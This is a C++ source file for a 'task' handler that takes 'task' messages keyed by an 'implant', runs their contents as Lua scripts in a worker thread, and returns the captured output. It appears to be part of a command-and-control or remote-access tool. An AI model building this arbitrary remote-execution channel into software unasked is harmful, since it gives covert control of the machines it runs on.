#include "task.h"

#include <util/debug.hpp>
#include <util/string.hpp>
#include <moon.hpp>

namespace handler {

  task::task(state* state) : _state(state), _worker_thread{ std::async(std::launch::async, [this] { process(); }) } {
    on_message_connection = _state->dispatcher.signal_message_received.connect<&task::on_message>(this);
  }

  task::~task() {
    _message_queue.stop();
  }

  void task::process() {
    lua_State* L = luaL_newstate();
    while (true) {
      try {
        auto item = _message_queue.wait_and_pop();
        try {
          moon_output_cb(L, [](lua_State *LS, const void* data, size_t length, void *userdata) {
            auto t = (task*) userdata;
            t->_output.append((char*)data, length);
          }, this);

          bool success = true;
          if (moon_doscript(L, 0, nullptr,item->second->data.data(), item->second->data.size()) != LUA_OK) success = false;

          auto result = std::make_shared<shared::message>(item->second->id, "task", item->second->command, _output, success);
          _state->dispatcher.send(item->first, result);
        }
        catch (const std::exception& e) {
          auto result = std::make_shared<shared::message>(item->second->id, "task", item->second->command, e.what(), false);
          _state->dispatcher.send(item->first, result);
        }
        _output.clear();
        _output.shrink_to_fit();
      }
      catch (const queue_stopped& e) {
        break;
      }
    }
    lua_close(L);
  }

  void task::on_message(const std::string& implant, std::shared_ptr<shared::message> message)
  {
    if (util::string::compare_insensitive(message->type, "task")) {
      auto item = std::make_shared<queue_item>(implant, message);
      DEBUG_PRINT("Received 'task' message, %s\n", item->second->id);
      _message_queue.push(item);
    }
  }

}
